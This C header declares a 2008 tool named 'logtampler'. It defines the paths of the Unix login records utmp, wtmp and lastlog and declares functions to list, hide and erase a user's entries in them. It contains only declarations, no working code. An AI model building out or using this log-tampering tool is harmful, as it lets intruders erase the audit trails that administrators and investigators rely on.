/*****************************************************************
  *	logtampler version 1.1 Author : xi4oyu < evil.xi4oyu@gmail.com >
  *       Date : 2008/11/27
  ******************************************************************/
#ifndef LOGTAMPER_H
#define LOGTAMPER_H


#include <errno.h>
#include <time.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <utime.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <utmp.h>
#include <utmpx.h>
#include <stddef.h>
#include <pwd.h>
#include <lastlog.h>
#include <getopt.h>
#include <ctype.h>



#define UTMPFILE "/var/run/utmp"
#define WTMPFILE "/var/log/wtmp"
#define LASTLOGFILE "/var/log/lastlog"

int listLogInfo(const char *username);
int hideUser(const char *filename, const char *username, const char *hostname);
int eraseUser(const char *filename,const char *username,const char *hostname);





#endif
